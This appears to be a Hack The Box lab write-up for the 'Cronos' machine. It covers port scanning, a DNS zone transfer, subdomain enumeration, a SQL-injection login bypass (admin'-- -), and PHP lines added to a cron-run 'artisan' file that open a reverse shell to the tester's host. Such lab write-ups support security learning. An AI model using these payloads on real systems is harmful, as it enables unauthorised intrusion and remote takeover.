nmap
```
┌──(kali㉿kali)-[~/HTB/cronos]
└─$ sudo nmap -T5 -p- -A -oN nmap 10.129.227.211
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-12 23:07 EST
Warning: 10.129.227.211 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.129.227.211
Host is up (0.047s latency).
Not shown: 63939 closed tcp ports (reset), 1593 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Aggressive OS guesses: Linux 3.12 (96%), Linux 3.13 (96%), Linux 3.2 - 4.9 (96%), Linux 3.8 - 3.11 (96%), Linux 4.8 (96%), Linux 4.4 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 4.2 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   48.91 ms 10.10.14.1
2   49.13 ms 10.129.227.211

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 147.50 seconds
```

![Pasted image 20250113122918](<0. Attachments/Pasted image 20250113122918.png>)

dns enumeration
```
┌──(kali㉿kali)-[~/HTB/cronos]
└─$ nslookup    
> server 10.129.227.211
Default server: 10.129.227.211
Address: 10.129.227.211#53
> 10.129.227.211
211.227.129.10.in-addr.arpa     name = ns1.cronos.htb.
```

```
┌──(kali㉿kali)-[~/HTB/cronos]
└─$ dig axfr cronos.htb @10.129.227.211

; <<>> DiG 9.20.0-Debian <<>> axfr cronos.htb @10.129.227.211
;; global options: +cmd
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13
admin.cronos.htb.       604800  IN      A       10.10.10.13
ns1.cronos.htb.         604800  IN      A       10.10.10.13
www.cronos.htb.         604800  IN      A       10.10.10.13
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 111 msec
;; SERVER: 10.129.227.211#53(10.129.227.211) (TCP)
;; WHEN: Sun Jan 12 23:51:24 EST 2025
;; XFR size: 7 records (messages 1, bytes 203)
```

adding to /etc/hosts
```
10.129.227.211 cronos.htb admin.cronos.htb ns1.cronos.htb www.cronos.htb
```

```
┌──(kali㉿kali)-[~/HTB/cronos]
└─$ gobuster dns -d cronos.htb -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     cronos.htb
[+] Threads:    10
[+] Timeout:    1s
[+] Wordlist:   /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Found: www.cronos.htb

Found: ns1.cronos.htb

Found: admin.cronos.htb

Progress: 100000 / 100001 (100.00%)
===============================================================
Finished
===============================================================
```

![Pasted image 20250113125626](<0. Attachments/Pasted image 20250113125626.png>)

![Pasted image 20250113141534](<0. Attachments/Pasted image 20250113141534.png>)

for some reason username = admin'-- -    &&     password = admin'-- -     leads me to
![Pasted image 20250113141933](<0. Attachments/Pasted image 20250113141933.png>)

![Pasted image 20250113142648](<0. Attachments/Pasted image 20250113142648.png>)

we can get a reverse shell
![Pasted image 20250113142904](<0. Attachments/Pasted image 20250113142904.png>)
![Pasted image 20250113142925](<0. Attachments/Pasted image 20250113142925.png>)

upgrade shell
```
python -c 'import pty;pty.spawn("bash")'
stty raw -echo ; fg ; reset;
```

![Pasted image 20250113143127](<0. Attachments/Pasted image 20250113143127.png>)

found file artisan, so we just add 2 lines
```
$sock=fsockopen("10.10.14.4", 4444);
exec("/bin/sh -i <&3 >&3 2>&3");
```

![Pasted image 20250113145218](<0. Attachments/Pasted image 20250113145218.png>)